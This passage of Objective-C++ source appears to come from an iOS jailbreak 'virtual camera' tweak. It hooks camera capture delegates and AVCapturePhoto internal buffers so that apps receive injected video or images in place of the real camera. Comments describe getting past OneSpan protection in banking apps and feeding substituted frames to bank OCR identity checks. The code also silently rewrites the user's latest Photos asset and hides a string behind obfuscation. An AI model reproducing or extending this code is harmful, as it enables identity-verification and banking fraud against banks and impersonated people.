                                    ptTried = YES;
                                }
                                // Stream/image only: try CIContext rebuild (will be black if Metal blocked)
                                if (!nsb && (vcam_streamFrameExists() || vcam_imageExists())) {
                                    nsb = vcam_buildReplacementSampleBuffer(sb);
                                }
                                if (nsb) { sbToForward = nsb; builtNew = YES; }
                                // Build 182: video-mode passthrough fail → forward orig (don't in-place;
                                // OneSpan locks the buffer storage so writes never reach OCR).
                                else if (!ptTried) { vcam_replaceInPlace(sb); }
                            } else {
                                vcam_replaceInPlace(sb);
                            }
                        }
                        // Forward to the original class chain (triggers forwarding/proxy if used)
                        struct objc_super sup;
                        sup.receiver = _s;
                        sup.super_class = parentClass;
                        typedef void (*SuperFn)(struct objc_super *, SEL, id, CMSampleBufferRef, id);
                        SuperFn msgSendSuper = (SuperFn)objc_msgSendSuper;
                        msgSendSuper(&sup, sel, o, sbToForward, c);
                        if (builtNew) CFRelease(sbToForward);
                    } @catch (NSException *e) {}
                });

            class_addMethod(subClass, sel, newIMP, "v@:@^{opaqueCMSampleBuffer=}@");
            @synchronized(gHookIMPs) {
                [gHookIMPs addObject:@((uintptr_t)newIMP)];
            }

            objc_registerClassPair(subClass);
        }

        // Swizzle the instance's ISA to our subclass
        object_setClass(delegate, subClass);

        @synchronized(gISASwizzledObjects) {
            [gISASwizzledObjects addObject:ptr];
        }
        @synchronized(gHookedClasses) {
            [gHookedClasses addObject:origName];
        }

        vcam_log([NSString stringWithFormat:@"ISA swizzled %@ → %@", origName, subName]);
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"ISA swizzle exception: %@", e.reason]);
    }
}

// MSHookMessageEx — same hook mechanism vcam123 uses. Linked via -lsubstrate so
// dyld auto-resolves at vcamplus load time → ellekit gets loaded into the same
// process, AND the symbol address is the REAL ellekit code (not a OneSpan-mprotected
// decoy that dlsym(RTLD_DEFAULT) returns).
// extern "C" needed because Tweak.xm is Objective-C++ — without it, the linker looks
// for the C++-mangled name and fails with "_MSHookMessageEx not found".
#ifdef __cplusplus
extern "C" {
#endif
extern void MSHookMessageEx(Class _class, SEL message, IMP hook, IMP *old);
#ifdef __cplusplus
}
#endif

// Returns YES if MSHookMessageEx-based swap succeeded. *origOut gets the original IMP.
static BOOL vcam_msHookMessage(Class cls, SEL sel, IMP hookIMP, IMP *origOut) {
    @try {
        MSHookMessageEx(cls, sel, hookIMP, origOut);
        return YES;
    }
    @catch (NSException *e) { return NO; }
}

static void vcam_hookClass(Class cls) {
    @try {
        if (!cls) return;
        NSString *cn = NSStringFromClass(cls);
        SEL sel = @selector(captureOutput:didOutputSampleBuffer:fromConnection:);
        Method m = class_getInstanceMethod(cls, sel);
        if (!m) {
            // Method doesn't exist (e.g. WeChat MMContextObject uses message forwarding).
            // Don't add a method — that would break the forwarding chain.
            // Instead, dump class info for debugging and try to find+hook the real handler.
            vcam_log([NSString stringWithFormat:@"SampleBuffer method not found on %@, probing class", cn]);

            // Dump class hierarchy and ivars for debugging
            @try {
                Class super_ = class_getSuperclass(cls);
                vcam_log([NSString stringWithFormat:@"%@ super: %@", cn,
                    super_ ? NSStringFromClass(super_) : @"nil"]);

                unsigned int ivarCount = 0;
                Ivar *ivars = class_copyIvarList(cls, &ivarCount);
                NSMutableString *ivarStr = [NSMutableString stringWithFormat:@"%@ ivars(%u):", cn, ivarCount];
                for (unsigned int i = 0; i < ivarCount && i < 20; i++) {
                    const char *name = ivar_getName(ivars[i]);
                    const char *type = ivar_getTypeEncoding(ivars[i]);
                    [ivarStr appendFormat:@" %s(%s)", name, type ? type : "?"];
                }
                if (ivars) free(ivars);
                vcam_log(ivarStr);

                // Check if any ivar holds a delegate that implements the method
                ivars = class_copyIvarList(cls, &ivarCount);
                for (unsigned int i = 0; i < ivarCount; i++) {
                    const char *typeEnc = ivar_getTypeEncoding(ivars[i]);
                    if (typeEnc && typeEnc[0] == '@') {
                        // Object ivar — might be an inner delegate
                        // We can't read its value without an instance, so just log it
                    }
                }
                if (ivars) free(ivars);

                // List methods on the class
                unsigned int methodCount = 0;
                Method *methods = class_copyMethodList(cls, &methodCount);
                NSMutableString *methodStr = [NSMutableString stringWithFormat:@"%@ methods(%u):", cn, methodCount];
                for (unsigned int i = 0; i < methodCount && i < 30; i++) {
                    [methodStr appendFormat:@" %@", NSStringFromSelector(method_getName(methods[i]))];
                }
                if (methods) free(methods);
                vcam_log(methodStr);

                // Check protocols
                unsigned int protoCount = 0;
                Protocol * __unsafe_unretained *protocols = class_copyProtocolList(cls, &protoCount);
                if (protoCount > 0) {
                    NSMutableString *protoStr = [NSMutableString stringWithFormat:@"%@ protocols(%u):", cn, protoCount];
                    for (unsigned int i = 0; i < protoCount; i++) {
                        [protoStr appendFormat:@" %s", protocol_getName(protocols[i])];
                    }
                    if (protocols) free(protocols);
                    vcam_log(protoStr);
                }
            } @catch (NSException *e) {}
            return;
        }
        IMP cur = method_getImplementation(m);
        @synchronized(gHookIMPs) {
            if ([gHookIMPs containsObject:@((uintptr_t)cur)]) return;
        }
        IMP *store = (IMP *)calloc(1, sizeof(IMP));
        if (!store) return;
        SEL cs = sel;
        __block int logCount = 0;
        NSString *capCN = cn;
        IMP hook = imp_implementationWithBlock(
            ^(id _s, AVCaptureOutput *o, CMSampleBufferRef sb, AVCaptureConnection *c) {
                @try {
                    OrigCapIMP fn = (OrigCapIMP)(*store);
                    if (logCount < 3) {
                        logCount++;
                        vcam_log([NSString stringWithFormat:@"HookCall %@: fn=%p enabled=%@",
                            capCN, (void*)fn, vcam_isEnabled() ? @"Y" : @"N"]);
                    }
                    if (!fn) return;
                    CMSampleBufferRef sbToForward = sb;
                    BOOL builtNew = NO;
                    if (vcam_isEnabled()) {
                        if (vcam_isBufferReplaceWhitelisted()) {
                            CMSampleBufferRef nsb = NULL;
                            BOOL passthroughTried = NO;
                            if (!vcam_streamFrameExists() && !vcam_imageExists() && vcam_videoExists()) {
                                nsb = vcam_buildPassthroughSampleBuffer(sb);
                                passthroughTried = YES;
                            }
                            // Only do CIContext rebuild for stream/image mode (no passthrough source).
                            // For video mode, passthrough failure → in-place fallback (avoids empty buf).
                            if (!nsb && (vcam_streamFrameExists() || vcam_imageExists())) {
                                nsb = vcam_buildReplacementSampleBuffer(sb);
                            }
                            if (nsb) {
                                sbToForward = nsb;
                                builtNew = YES;
                                if (logCount >= 3 && logCount < 6) {
                                    logCount++;
                                    CVImageBufferRef npb = CMSampleBufferGetImageBuffer(nsb);
                                    OSType nfmt = npb ? CVPixelBufferGetPixelFormatType(npb) : 0;
                                    vcam_log([NSString stringWithFormat:@"BufReplace %@ %s new=%zux%zu fmt=0x%x",
                                        capCN, passthroughTried ? "PASSTHROUGH" : "rebuild",
                                        npb ? CVPixelBufferGetWidth(npb) : 0, npb ? CVPixelBufferGetHeight(npb) : 0,
                                        (unsigned)nfmt]);
                                }
                            } else if (passthroughTried) {
                                // Build 182 fix: video-mode passthrough failed → DO NOT fall back to
                                // vcam_replaceInPlace. OneSpan locks the camera buffer's pixel storage,
                                // so in-place writes don't reach OCR. Forward original sb instead;
                                // the next frame will likely succeed (cache backfills @ 30 fps).
                                if (logCount >= 3 && logCount < 6) {
                                    logCount++;
                                    vcam_log([NSString stringWithFormat:@"BufReplace %@ PASSTHROUGH FAIL → forwarding orig (cache warm-up)",
                                        capCN]);
                                }
                            } else {
                                BOOL ok = vcam_replaceInPlace(sb);
                                if (logCount >= 3 && logCount < 6) {
                                    logCount++;
                                    vcam_log([NSString stringWithFormat:@"BufReplace %@ build FAIL → in-place=%@",
                                        capCN, ok ? @"OK" : @"FAIL"]);
                                }
                            }
                        } else {
                            BOOL ok = vcam_replaceInPlace(sb);
                            if (logCount >= 3 && logCount < 6) {
                                logCount++;
                                CVImageBufferRef pb = CMSampleBufferGetImageBuffer(sb);
                                OSType fmt = pb ? CVPixelBufferGetPixelFormatType(pb) : 0;
                                vcam_log([NSString stringWithFormat:@"VideoFrame %@ replace=%@ fmt=0x%x",
                                    capCN, ok ? @"OK" : @"FAIL", (unsigned)fmt]);
                            }
                        }
                    }
                    fn(_s, cs, o, sbToForward, c);
                    if (builtNew) CFRelease(sbToForward);
                } @catch (NSException *e) {}
            });
        // Use MSHookMessageEx (linked from libsubstrate via -lsubstrate). vcam123 uses
        // this exact mechanism. The symbol resolves at dyld load time → ellekit gets
        // co-loaded into the process, and the function address is real ellekit code
        // (not a OneSpan-mprotected decoy).
        BOOL hookedViaMS = vcam_msHookMessage(cls, sel, hook, store);
        if (!hookedViaMS) {
            // Fallback: standard ObjC runtime swap (OneSpan often blocks this in
            // banking apps but works elsewhere)
            *store = cur;
            class_addMethod(cls, sel, cur, method_getTypeEncoding(m));
            m = class_getInstanceMethod(cls, sel);
            method_setImplementation(m, hook);
        }
        @synchronized(gHookIMPs) {
            [gHookIMPs addObject:@((uintptr_t)hook)];
        }
        BOOL rehook = NO;
        @synchronized(gHookedClasses) {
            rehook = [gHookedClasses containsObject:cn];
            [gHookedClasses addObject:cn];
        }
        vcam_log([NSString stringWithFormat:@"%@: %@", rehook ? @"Re-hooked" : @"Hooked", cn]);
    } @catch (NSException *e) {}
}

typedef void (*OrigPhotoDelegateIMP)(id, SEL, id, id, NSError *);

// Dynamically hook photo data methods on the ACTUAL class of the AVCapturePhoto object
// (system may use a private subclass that overrides these methods)
static void vcam_hookPHAsset(void);

// Replace ALL internal pixel buffers inside AVCapturePhoto so every consumer gets virtual data
static void vcam_replacePhotoInternals(id photo) {
    @try {
        if (!photo) return;
        Ivar intIvar = class_getInstanceVariable(objc_getClass("AVCapturePhoto"), "_internal");
        if (!intIvar) { vcam_log(@"_internal ivar not found"); return; }
        id internal = object_getIvar(photo, intIvar);
        if (!internal) { vcam_log(@"_internal is nil"); return; }
        Class ic = object_getClass(internal);
        int count = 0;

        // Load IOSurface functions
        vcam_loadIOSurfaceFuncs();

        // Get IOSurface info first (needed for dimensions if photoPixelBuffer is NULL)
        Ivar surfIvar = class_getInstanceVariable(ic, "photoSurface");
        void *surf = NULL;
        size_t surfW = 0, surfH = 0, surfBPR = 0;
        uint32_t surfFmt = 0;
        if (surfIvar) {
            ptrdiff_t off = ivar_getOffset(surfIvar);
            void **surfPtr = (void **)((uint8_t *)(__bridge void *)internal + off);
            surf = *surfPtr;
        }
        if (surf && iosurf_GetWidth && iosurf_GetHeight) {
            surfW = iosurf_GetWidth(surf);
            surfH = iosurf_GetHeight(surf);
            if (iosurf_GetBytesPerRow) surfBPR = iosurf_GetBytesPerRow(surf);
            if (iosurf_GetPixelFormat) surfFmt = iosurf_GetPixelFormat(surf);
            vcam_log([NSString stringWithFormat:@"IOSurface: %zux%zu bpr=%zu fmt=0x%x", surfW, surfH, surfBPR, surfFmt]);
        }

        BOOL useBufReplace = vcam_isBufferReplaceWhitelisted();

        // 1. Replace photoPixelBuffer (main photo data)
        Ivar pbIvar = class_getInstanceVariable(ic, "photoPixelBuffer");
        if (pbIvar) {
            ptrdiff_t off = ivar_getOffset(pbIvar);
            CVPixelBufferRef *pbPtr = (CVPixelBufferRef *)((uint8_t *)(__bridge void *)internal + off);
            if (*pbPtr) {
                if (useBufReplace) {
                    CVPixelBufferRef nb = vcam_buildReplacementPixelBufferMatching(*pbPtr);
                    if (nb) {
                        OSType oldFmt = CVPixelBufferGetPixelFormatType(*pbPtr);
                        size_t w = CVPixelBufferGetWidth(*pbPtr), h = CVPixelBufferGetHeight(*pbPtr);
                        CVPixelBufferRelease(*pbPtr);
                        *pbPtr = nb;
                        count++;
                        vcam_log([NSString stringWithFormat:@"photoPixelBuffer SWAPPED %zux%zu fmt=0x%x (aspectFit)",
                            w, h, (unsigned)oldFmt]);
                    } else if (vcam_replacePixelBuffer(*pbPtr)) {
                        count++;
                        vcam_log(@"photoPixelBuffer in-place (swap fallback)");
                    }
                } else if (vcam_replacePixelBuffer(*pbPtr)) {
                    count++;
                    vcam_log([NSString stringWithFormat:@"photoPixelBuffer replaced (%zux%zu)",
                        CVPixelBufferGetWidth(*pbPtr), CVPixelBufferGetHeight(*pbPtr)]);
                }
            } else {
                vcam_log(@"photoPixelBuffer is NULL");
            }
        }

        // 2. Replace previewPixelBuffer
        Ivar pvIvar = class_getInstanceVariable(ic, "previewPixelBuffer");
        if (pvIvar) {
            ptrdiff_t off = ivar_getOffset(pvIvar);
            CVPixelBufferRef *pvPtr = (CVPixelBufferRef *)((uint8_t *)(__bridge void *)internal + off);
            if (*pvPtr) {
                if (useBufReplace) {
                    CVPixelBufferRef nb = vcam_buildReplacementPixelBufferMatching(*pvPtr);
                    if (nb) {
                        CVPixelBufferRelease(*pvPtr);
                        *pvPtr = nb;
                        count++;
                        vcam_log([NSString stringWithFormat:@"previewPixelBuffer SWAPPED to %zux%zu",
                            CVPixelBufferGetWidth(nb), CVPixelBufferGetHeight(nb)]);
                    } else if (vcam_replacePixelBuffer(*pvPtr)) {
                        count++;
                    }
                } else if (vcam_replacePixelBuffer(*pvPtr)) {
                    count++;
                    vcam_log(@"previewPixelBuffer replaced");
                }
            }
        }

        // 3. Replace embeddedThumbnailSourcePixelBuffer
        Ivar etIvar = class_getInstanceVariable(ic, "embeddedThumbnailSourcePixelBuffer");
        if (etIvar) {
            ptrdiff_t off = ivar_getOffset(etIvar);
            CVPixelBufferRef *etPtr = (CVPixelBufferRef *)((uint8_t *)(__bridge void *)internal + off);
            if (*etPtr) {
                if (useBufReplace) {
                    CVPixelBufferRef nb = vcam_buildReplacementPixelBufferMatching(*etPtr);
                    if (nb) {
                        CVPixelBufferRelease(*etPtr);
                        *etPtr = nb;
                        count++;
                        vcam_log(@"embeddedThumbnailSourcePixelBuffer SWAPPED");
                    } else if (vcam_replacePixelBuffer(*etPtr)) {
                        count++;
                    }
                } else if (vcam_replacePixelBuffer(*etPtr)) {
                    count++;
                    vcam_log(@"embeddedThumbnailSourcePixelBuffer replaced");
                }
            }
        }

        // 4. Replace photoSurface (IOSurface) via IOSurface API
        if (surf && iosurf_Lock && iosurf_Unlock && iosurf_GetBaseAddress) {
            iosurf_Lock(surf, 0, NULL);
            void *sbase = iosurf_GetBaseAddress(surf);
            size_t allocSize = iosurf_GetAllocSize ? iosurf_GetAllocSize(surf) : 0;
            vcam_log([NSString stringWithFormat:@"IOSurface base=%p alloc=%zu fmt=0x%x", sbase, allocSize, surfFmt]);

            if (sbase && allocSize > 0) {
                if (surfFmt == 0x4a504547) {
                    // JPEG format IOSurface — decode original to get dimensions, then write matching JPEG
                    Ivar szIvar = class_getInstanceVariable(ic, "photoSurfaceSize");
                    size_t origJPEGLen = 0;
                    if (szIvar) {
                        ptrdiff_t szOff = ivar_getOffset(szIvar);
                        unsigned long long *szPtr = (unsigned long long *)((uint8_t *)(__bridge void *)internal + szOff);
                        origJPEGLen = (size_t)*szPtr;
                        vcam_log([NSString stringWithFormat:@"photoSurfaceSize was: %llu", *szPtr]);
                    }
                    if (origJPEGLen == 0 || origJPEGLen > allocSize) origJPEGLen = allocSize;

                    // Decode original JPEG to get photo dimensions
                    size_t photoW = 0, photoH = 0;
                    @autoreleasepool {
                        NSData *origData = [NSData dataWithBytesNoCopy:sbase length:origJPEGLen freeWhenDone:NO];
                        CGImageSourceRef origSrc = CGImageSourceCreateWithData((__bridge CFDataRef)origData, NULL);
                        if (origSrc) {
                            CGImageRef origImg = CGImageSourceCreateImageAtIndex(origSrc, 0, NULL);
                            if (origImg) {
                                photoW = CGImageGetWidth(origImg);
                                photoH = CGImageGetHeight(origImg);
                                CGImageRelease(origImg);
                            }
                            CFRelease(origSrc);
                        }
                    }
                    vcam_log([NSString stringWithFormat:@"Original photo dims: %zux%zu", photoW, photoH]);
                    if (photoW > 0 && photoH > 0) { gLastPhotoW = photoW; gLastPhotoH = photoH; }

                    // Generate replacement JPEG.
                    // Whitelisted apps (Hyakugo bank etc.): JPEG at source-native dimensions
                    // so OCR's coordinate system matches our content (vcam123-compatible).
                    // Other apps: JPEG at original photo dimensions with aspectFill (legacy behavior).
                    NSData *jpeg = nil;
                    if (useBufReplace && photoW > 0 && photoH > 0) {
                        jpeg = vcam_buildReplacementJPEG(photoW, photoH);
                        if (jpeg) {
                            vcam_log([NSString stringWithFormat:@"Generated JPEG %zux%zu (aspectFit) -> %lu bytes",
                                photoW, photoH, (unsigned long)jpeg.length]);
                        }
                    }
                    if (!jpeg && photoW > 0 && photoH > 0 && gCICtx) {
                        CIImage *virtImg = nil;
                        // Stream mode
                        if (vcam_streamFrameExists()) {
                            NSData *sdata = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                            if (sdata.length > 0) {
                                CGImageSourceRef ssrc = CGImageSourceCreateWithData((__bridge CFDataRef)sdata, NULL);
                                if (ssrc) {
                                    CGImageRef cg = CGImageSourceCreateImageAtIndex(ssrc, 0, NULL);
                                    CFRelease(ssrc);
                                    if (cg) { virtImg = [CIImage imageWithCGImage:cg]; CGImageRelease(cg); }
                                }
                            }
                        }
                        // Image mode
                        if (!virtImg && vcam_imageExists()) virtImg = vcam_loadStaticImage();
                        // Video mode (with transforms)
                        CMSampleBufferRef _vf = nil;
                        if (!virtImg) {
                            _vf = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
                            if (_vf) {
                                CVImageBufferRef pb = CMSampleBufferGetImageBuffer(_vf);
                                if (pb) virtImg = [CIImage imageWithCVImageBuffer:pb];
                            }
                            if (virtImg) virtImg = vcam_applyVideoTransforms(virtImg);
                        }
                        if (virtImg) {
                            virtImg = vcam_aspectFill(virtImg, photoW, photoH);
                            // Apply user-set pan offset (matches preview path)
                            virtImg = vcam_applyOffset(virtImg, photoW, photoH, gVideoOffsetX, gVideoOffsetY);
                            virtImg = vcam_applyColorInject(virtImg);
                            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                            jpeg = [gCICtx JPEGRepresentationOfImage:virtImg colorSpace:cs options:@{}];
                            CGColorSpaceRelease(cs);
                            vcam_log([NSString stringWithFormat:@"Generated JPEG %zux%zu -> %lu bytes",
                                photoW, photoH, (unsigned long)(jpeg ? jpeg.length : 0)]);
                        }
                        if (_vf) CFRelease(_vf);
                    }
                    // Fallback to source-native JPEG if dimension-aware generation failed
                    if (!jpeg) jpeg = vcam_currentFrameAsJPEG();

                    if (jpeg && jpeg.length <= allocSize) {
                        memcpy(sbase, jpeg.bytes, jpeg.length);
                        if (jpeg.length < allocSize) {
                            memset((uint8_t *)sbase + jpeg.length, 0, allocSize - jpeg.length);
                        }
                        count++;
                        vcam_log([NSString stringWithFormat:@"IOSurface JPEG replaced (%lu into %zu)",
                            (unsigned long)jpeg.length, allocSize]);
                        if (szIvar) {
                            ptrdiff_t szOff = ivar_getOffset(szIvar);
                            unsigned long long *szPtr = (unsigned long long *)((uint8_t *)(__bridge void *)internal + szOff);
                            *szPtr = (unsigned long long)jpeg.length;
                            vcam_log([NSString stringWithFormat:@"photoSurfaceSize set to: %llu", *szPtr]);
                        }
                    } else if (jpeg) {
                        vcam_log([NSString stringWithFormat:@"JPEG too large: %lu > %zu",
                            (unsigned long)jpeg.length, allocSize]);
                    }
                } else if (surfW > 0 && surfH > 0) {
                    // Raw pixel format — render virtual image, memcpy to IOSurface
                    CVPixelBufferRef tmpPB = NULL;
                    CVReturn tcr = CVPixelBufferCreate(NULL, surfW, surfH, kCVPixelFormatType_32BGRA, NULL, &tmpPB);
                    if (tcr == kCVReturnSuccess && tmpPB) {
                        if (vcam_replacePixelBuffer(tmpPB)) {
                            CVPixelBufferLockBaseAddress(tmpPB, kCVPixelBufferLock_ReadOnly);
                            void *tmpBase = CVPixelBufferGetBaseAddress(tmpPB);
                            size_t tmpBPR = CVPixelBufferGetBytesPerRow(tmpPB);
                            size_t copyBPR = (tmpBPR < surfBPR) ? tmpBPR : surfBPR;
                            for (size_t y = 0; y < surfH; y++) {
                                memcpy((uint8_t *)sbase + y * surfBPR, (uint8_t *)tmpBase + y * tmpBPR, copyBPR);
                            }
                            CVPixelBufferUnlockBaseAddress(tmpPB, kCVPixelBufferLock_ReadOnly);
                            count++;
                            vcam_log(@"photoSurface replaced via pixel memcpy");
                        }
                        CVPixelBufferRelease(tmpPB);
                    }
                }
            } else {
                vcam_log(@"IOSurface base=NULL or allocSize=0");
            }
            iosurf_Unlock(surf, 0, NULL);
        }

        vcam_log([NSString stringWithFormat:@"Photo internals: %d buffers replaced", count]);

        // Log orientation values (do NOT modify — changing orientation can crash
        // apps like TikTok whose processing pipeline depends on original values)
        const char *orientNames[] = {"photoOrientation", "sensorOrientation",
            "imageOrientation", "orientation", "captureOrientation", NULL};
        for (int i = 0; orientNames[i]; i++) {
            Ivar oi = class_getInstanceVariable(ic, orientNames[i]);
            if (oi) {
                ptrdiff_t off = ivar_getOffset(oi);
                int32_t *oPtr = (int32_t *)((uint8_t *)(__bridge void *)internal + off);
                vcam_log([NSString stringWithFormat:@"orientation '%s': %d (kept)", orientNames[i], *oPtr]);
            }
        }
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"replacePhotoInternals error: %@", e]);
    }
}

// Edit the latest photo in Photos library using PHContentEditingOutput API
static void vcam_editLatestPhoto(void) {
    @try {
        vcam_log(@"editLatestPhoto: starting");

        void *h = dlopen("/System/Library/Frameworks/Photos.framework/Photos", RTLD_LAZY);
        if (!h) { vcam_log(@"editLatestPhoto: Photos dlopen FAIL"); return; }

        Class PHAssetClass = objc_getClass("PHAsset");
        Class PHFetchOptionsClass = objc_getClass("PHFetchOptions");
        Class PHContentEditingOutputClass = objc_getClass("PHContentEditingOutput");
        Class PHAdjustmentDataClass = objc_getClass("PHAdjustmentData");
        Class PHAssetChangeRequestClass = objc_getClass("PHAssetChangeRequest");
        Class PHPhotoLibraryClass = objc_getClass("PHPhotoLibrary");

        if (!PHAssetClass || !PHFetchOptionsClass || !PHContentEditingOutputClass ||
            !PHAdjustmentDataClass || !PHAssetChangeRequestClass || !PHPhotoLibraryClass) {
            vcam_log(@"editLatestPhoto: Photos classes not found");
            return;
        }

        // Fetch the most recent image asset
        PHFetchOptions *opts = [[PHFetchOptionsClass alloc] init];
        opts.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
        opts.fetchLimit = 1;

        PHFetchResult *result = (PHFetchResult *)[PHAssetClass fetchAssetsWithMediaType:1 options:opts]; // 1 = PHAssetMediaTypeImage
        PHAsset *asset = (PHAsset *)[result firstObject];
        if (!asset) {
            vcam_log(@"editLatestPhoto: no recent photo found");
            return;
        }

        vcam_log([NSString stringWithFormat:@"editLatestPhoto: found asset %@", [asset valueForKey:@"localIdentifier"]]);

        // Request editing input
        [asset requestContentEditingInputWithOptions:nil completionHandler:^(id input, NSDictionary *info) {
            @try {
                if (!input) {
                    vcam_log([NSString stringWithFormat:@"editLatestPhoto: editing input nil, info=%@", info]);
                    return;
                }

                PHContentEditingOutput *output = [[PHContentEditingOutputClass alloc] initWithContentEditingInput:input];
                NSURL *renderedURL = output.renderedContentURL;
                vcam_log([NSString stringWithFormat:@"editLatestPhoto: renderedURL=%@", renderedURL]);

                if (!renderedURL) {
                    vcam_log(@"editLatestPhoto: renderedURL is nil");
                    return;
                }

                // Determine output format from URL extension
                NSString *ext = [[renderedURL pathExtension] lowercaseString];
                NSData *imgData = nil;

                if ([ext isEqualToString:@"heic"] || [ext isEqualToString:@"heif"]) {
                    CIImage *ci = nil;
                    CMSampleBufferRef _ef = nil;
                    // Stream mode: use stream frame first
                    if (vcam_streamFrameExists()) {
                        NSData *sd = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                        if (sd.length > 0) {
                            ci = [CIImage imageWithData:sd];
                        }
                    }
                    // Image mode
                    if (!ci && vcam_imageExists()) ci = vcam_loadStaticImage();
                    // Video mode
                    if (!ci && gCICtx) {
                        _ef = vcam_readFrame(gLockB, &gReaderB, &gOutputB);
                        if (_ef) {
                            CVImageBufferRef pb = CMSampleBufferGetImageBuffer(_ef);
                            if (pb) ci = [CIImage imageWithCVImageBuffer:pb];
                        }
                        if (ci) ci = vcam_applyVideoTransforms(ci);
                    }
                    if (ci && gCICtx) {
                        // AspectFill to match photo dimensions
                        size_t epW = gLastPhotoW > 0 ? gLastPhotoW : 3024;
                        size_t epH = gLastPhotoH > 0 ? gLastPhotoH : 4032;
                        ci = vcam_aspectFill(ci, epW, epH);
                        // Apply user-set pan offset (matches preview path)
                        ci = vcam_applyOffset(ci, epW, epH, gVideoOffsetX, gVideoOffsetY);
                        ci = vcam_applyColorInject(ci);
                        CGImageRef cgImg = [gCICtx createCGImage:ci fromRect:ci.extent];
                        if (_ef) { CFRelease(_ef); _ef = nil; }
                        if (cgImg) {
                            NSMutableData *heicBuf = [NSMutableData data];
                            CGImageDestinationRef dest = CGImageDestinationCreateWithData(
                                (__bridge CFMutableDataRef)heicBuf,
                                (__bridge CFStringRef)@"public.heic", 1, NULL);
                            if (dest) {
                                CGImageDestinationAddImage(dest, cgImg, NULL);
                                if (CGImageDestinationFinalize(dest)) {
                                    imgData = heicBuf;
                                    vcam_log([NSString stringWithFormat:@"editLatestPhoto: HEIC %lu bytes",
                                        (unsigned long)imgData.length]);
                                }
                                CFRelease(dest);
                            }
                            CGImageRelease(cgImg);
                        }
                    }
                    if (_ef) CFRelease(_ef);
                    if (!imgData) imgData = vcam_currentFrameAsJPEG();
                } else {
                    imgData = vcam_currentFrameAsJPEG();
                }

                if (!imgData) {
                    vcam_log(@"editLatestPhoto: failed to generate image data");
                    return;
                }

                // Write our virtual image to renderedContentURL
                NSError *writeErr = nil;
                BOOL writeOK = [imgData writeToURL:renderedURL options:NSDataWritingAtomic error:&writeErr];
                vcam_log([NSString stringWithFormat:@"editLatestPhoto: write %@ (%lu bytes) err=%@",
                    writeOK ? @"OK" : @"FAIL", (unsigned long)imgData.length, writeErr]);
                if (!writeOK) return;

                // Set adjustment data (required by Photos editing API)
                PHAdjustmentData *adj = [[PHAdjustmentDataClass alloc]
                    initWithFormatIdentifier:_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x52\x53\x5E\x43",17)
                    formatVersion:@"1.0"
                    data:[@"vcam" dataUsingEncoding:NSUTF8StringEncoding]];
                output.adjustmentData = adj;

                // Apply the edit to Photos database
                gIsVCamEditing = YES;
                PHPhotoLibrary *lib = [PHPhotoLibraryClass performSelector:@selector(sharedPhotoLibrary)];
                [lib performChanges:^{
                    PHAssetChangeRequest *req = [PHAssetChangeRequestClass changeRequestForAsset:(PHAsset *)asset];
                    req.contentEditingOutput = output;
                } completionHandler:^(BOOL success, NSError *error) {
                    gIsVCamEditing = NO;
                    vcam_log([NSString stringWithFormat:@"editLatestPhoto: %@ err=%@",
                        success ? @"SUCCESS" : @"FAIL", error]);
                }];

            } @catch (NSException *e) {
                vcam_log([NSString stringWithFormat:@"editLatestPhoto inner error: %@", e]);
            }
        }];
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"editLatestPhoto outer error: %@", e]);
    }
}


static void vcam_hookPhotoDataOnClass(Class cls) {
    if (!cls) return;
    NSString *cn = NSStringFromClass(cls);
    @synchronized(gHookedPhotoClasses) {
        if ([gHookedPhotoClasses containsObject:cn]) return;
        [gHookedPhotoClasses addObject:cn];
    }
    vcam_log([NSString stringWithFormat:@"Photo class: %@, hooking data methods", cn]);
    // fileDataRepresentation — replace internal pixel buffers then call original
    {
        SEL sel = @selector(fileDataRepresentation);
        Method m = class_getInstanceMethod(cls, sel);
        if (m) {
            typedef NSData *(*F)(id, SEL);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^NSData *(id _self) {
                @try {
                    if (vcam_isEnabled()) {
                        gLastCaptureTime = CACurrentMediaTime();
                        vcam_hookPHAsset();
                        // Generate JPEG at photo dimensions if available
                        NSData *data = nil;
                        if (gLastPhotoW > 0 && gLastPhotoH > 0 && gCICtx) {
                            CIImage *img = nil;
                            if (vcam_streamFrameExists()) {
                                NSData *sd = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                                if (sd.length > 0) {
                                    CGImageSourceRef ss = CGImageSourceCreateWithData((__bridge CFDataRef)sd, NULL);
                                    if (ss) {
                                        CGImageRef cg = CGImageSourceCreateImageAtIndex(ss, 0, NULL);
                                        CFRelease(ss);
                                        if (cg) { img = [CIImage imageWithCGImage:cg]; CGImageRelease(cg); }
                                    }
                                }
                            }
                            if (!img && vcam_imageExists()) img = vcam_loadStaticImage();
                            CMSampleBufferRef _ff = nil;
                            if (!img) {
                                _ff = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
                                if (_ff) {
                                    CVImageBufferRef pb = CMSampleBufferGetImageBuffer(_ff);
                                    if (pb) img = [CIImage imageWithCVImageBuffer:pb];
                                }
                                if (img) img = vcam_applyVideoTransforms(img);
                            }
                            if (img) {
                                // byg vcam (vcam123) parity: aspectFit so the full video frame is visible
                                // in the JPEG. The previous aspectFill cropped+zoomed when the photo's
                                // target aspect ratio differs from the video (e.g. 16:9 video → 4:3 photo
                                // canvas), producing "放大的画面的一部分" in apps like MinnaNoGinko.
                                img = vcam_aspectFit(img, gLastPhotoW, gLastPhotoH);
                                CGRect _fitExt = img.extent;
                                if (_fitExt.origin.x != 0 || _fitExt.origin.y != 0) {
                                    img = [img imageByApplyingTransform:
                                        CGAffineTransformMakeTranslation(-_fitExt.origin.x, -_fitExt.origin.y)];
                                }
                                img = vcam_applyOffset(img, gLastPhotoW, gLastPhotoH, gVideoOffsetX, gVideoOffsetY);
                                img = vcam_applyColorInject(img);
                                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                                data = [gCICtx JPEGRepresentationOfImage:img colorSpace:cs options:@{}];
                                CGColorSpaceRelease(cs);
                            }
                            if (_ff) CFRelease(_ff);
                        }
